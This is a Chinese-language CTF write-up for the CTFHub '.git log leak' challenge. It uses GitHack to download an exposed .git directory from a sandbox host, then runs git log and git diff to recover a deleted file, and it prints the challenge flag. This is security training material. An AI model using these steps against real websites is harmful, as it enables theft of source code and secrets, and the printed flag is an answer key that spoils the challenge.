# CTFHUB_git log泄漏

## 题目内容

```
Where is flag?
```

## WriteUp
题目提示使用githack工具利用.git遗留，注意此工具是基于python2的(https://github.com/lijiejie/GitHack)



在根目录下存在/.git文件，直接使用githack利用

```
python GitHack.py http://challenge-68d59c441a213aa8.sandbox.ctfhub.com:10800/.git
```

结果如下

```
[+] Download and parse index file ...
50x.html
index.html
[OK] index.html
[OK] 50x.html
```

但是很明显，这里面没东西，但是既然是git log，那就可能是存在历史版本里面

我们先clone下来这个.git,这个需要使用另一个githack(https://github.com/BugScanTeam/GitHack)

用法和上面的githack相同，但是会将项目clone在在dist目录下

我们进入该目录执行

```
git log
```

得到结果

```
commit 1e4828c27d3714a9ddef87f82d52c96820cc4703 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Sat Aug 21 15:40:59 2021 +0000

    remove flag

commit 04630c4080b903e3d7b39c44eb8e889a3b4c7818
Author: CTFHub <sandbox@ctfhub.com>
Date:   Sat Aug 21 15:40:59 2021 +0000

    add flag

commit 80cbef21d7d7aa02d0195af1e73160fea03c4faa
Author: CTFHub <sandbox@ctfhub.com>
Date:   Sat Aug 21 15:40:59 2021 +0000

    init
(END)
```

在commit04630c4080b903e3d7b39c44eb8e889a3b4c7818中，信息为add flag,所以我们查看差异

```
git diff 04630
```

得到flag

```
diff --git a/32391726814615.txt b/32391726814615.txt
deleted file mode 100644
index 8216212..0000000
--- a/32391726814615.txt
+++ /dev/null
@@ -1 +0,0 @@
-ctfhub{2c106a551563b0c6319cf042}
diff --git a/50x.html b/50x.html
deleted file mode 100644
index 9071e0a..0000000
--- a/50x.html
+++ /dev/null
@@ -1,21 +0,0 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Error</title>
-<style>
-    body {
-        width: 35em;
-        margin: 0 auto;
-        font-family: Tahoma, Verdana, Arial, sans-serif;
-    }
-</style>
-</head>
-<body>
-<h1>An error occurred.</h1>
-<p>Sorry, the page you are looking for is currently unavailable.<br/>
```









